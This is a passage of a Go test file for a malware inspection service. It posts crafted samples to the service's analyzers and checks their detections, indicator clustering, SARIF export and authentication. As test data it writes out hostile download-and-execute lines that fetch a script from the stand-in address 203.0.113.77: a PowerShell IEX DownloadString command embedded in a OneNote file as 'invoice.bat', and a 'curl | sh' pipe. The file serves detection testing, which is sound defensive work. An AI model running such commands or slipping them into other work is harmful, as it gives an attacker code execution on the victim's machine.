			t.Fatalf("dotnet: %v %v", r.Analyzers, r.Errors)
		}
		script := []byte("@echo off\r\npowershell -c IEX(New-Object Net.WebClient).DownloadString('http://203.0.113.77/q.ps1')\r\n")
		r = inspectPost(t, mux, "/v1/inspect/file?name=a.one", "application/octet-stream", buildOneNote([][]byte{script}, "invoice.bat", "double click to open"))
		fileMustHave(t, &r, "onenote-embedded-script", "onenote-launcher-name")
		r = inspectPost(t, mux, "/v1/inspect/lockfile?name=manifest.json", "text/plain", []byte(evilManifest))
		fileMustHave(t, &r, "ext-perm-debugger", "ext-remote-code")
		r = inspectPost(t, mux, "/v1/inspect/script?name=setup.py", "text/plain", []byte(evilSetupPy))
		fileMustHave(t, &r, "pypi-cmdclass-hook")
		r = inspectPost(t, mux, "/v1/inspect/file?name=p.tgz", "application/octet-stream", tgz(map[string]string{"package/package.json": evilNpmJSON, "package/setup.js": evilSetupJS}))
		fileMustHave(t, &r, "pkg-exfil-webhook")

		// two reports sharing an indicator cluster together
		inspectPost(t, mux, "/v1/inspect/script", "text/plain", []byte("curl http://203.0.113.77/q.ps1 | sh"))
		m, _ := getJSON(t, mux, "/v1/inspect/clusters", 200)
		if m["mode"] != "observe-only" || m["count"].(float64) < 1 {
			t.Fatalf("clusters %v", m)
		}
		cl := m["clusters"].([]any)[0].(map[string]any)
		if cl["explanation"] == "" || len(cl["shared_factors"].([]any)) == 0 {
			t.Fatalf("cluster not explainable: %v", cl)
		}
		getJSON(t, mux, "/v1/inspect/clusters?kind=bogus", 400)
		getJSON(t, mux, "/v1/inspect/clusters?kind=script&limit=1&min_score=2", 200)

		s, ct := getJSON(t, mux, "/v1/inspect/sarif?id=latest", 200)
		if s["version"] != "2.1.0" || !strings.HasPrefix(ct, "application/sarif+json") {
			t.Fatalf("sarif %v %s", s["version"], ct)
		}
		getJSON(t, mux, "/v1/inspect/sarif?id=insp-0", 404)
		getJSON(t, mux, "/v1/inspect/sarif", 400)
		// the export is pull-only: POST is not routed
		req := httptest.NewRequest("POST", "/v1/inspect/sarif?id=latest", nil)
		req.Header.Set("Authorization", "Bearer tok")
		w := httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusMethodNotAllowed && w.Code != http.StatusNotFound {
			t.Fatalf("POST sarif -> %d", w.Code)
		}
		// auth is required
		req = httptest.NewRequest("GET", "/v1/inspect/clusters", nil)
		w = httptest.NewRecorder()
		mux.ServeHTTP(w, req)
		if w.Code != http.StatusUnauthorized && w.Code != http.StatusForbidden {
			t.Fatalf("unauthenticated -> %d", w.Code)
		}
	})
}

// ---------- fuzz ----------

func FuzzExtraAnalyzers(f *testing.F) {
	f.Add(evilDotNet())
	f.Add(buildOneNote([][]byte{[]byte("MZ......")}, "a.hta"))
	f.Add([]byte(evilManifest))
	f.Add([]byte(evilNpmJSON))
	f.Add([]byte(evilSetupPy))
	f.Add(tgz(map[string]string{"package/package.json": evilNpmJSON}))
	f.Add(zipOf(map[string]string{"manifest.json": evilManifest}))
	f.Fuzz(func(t *testing.T, data []byte) {
		if len(data) > 1<<20 {
			return
		}
		ctx := context.Background()
		analyzeDotNet(ctx, data, fileTestBuilder())
		if len(data) >= 16 {
			copy(data, oneFileGUID)
			analyzeOneNote(ctx, data, fileTestBuilder())
		}
		analyzePkg(ctx, InspectInput{Kind: InspectKindFile, Data: data}, fileTestBuilder())
		analyzePkg(ctx, InspectInput{Kind: InspectKindLockfile, Text: string(data), Name: "package.json"}, fileTestBuilder())
		analyzePkg(ctx, InspectInput{Kind: InspectKindScript, Text: string(data), Name: "setup.py"}, fileTestBuilder())
		ClusterInspectReports([]*InspectReport{{ID: "a", SHA256: string(data), IOCs: []InspectIOC{{Type: "url", Value: string(data)}}}, {ID: "b", SHA256: "b"}}, ClusterOptions{})
		InspectSARIF(&InspectReport{Name: string(data), Findings: []InspectFinding{{ID: string(data), Severity: "high"}}})
	})
}
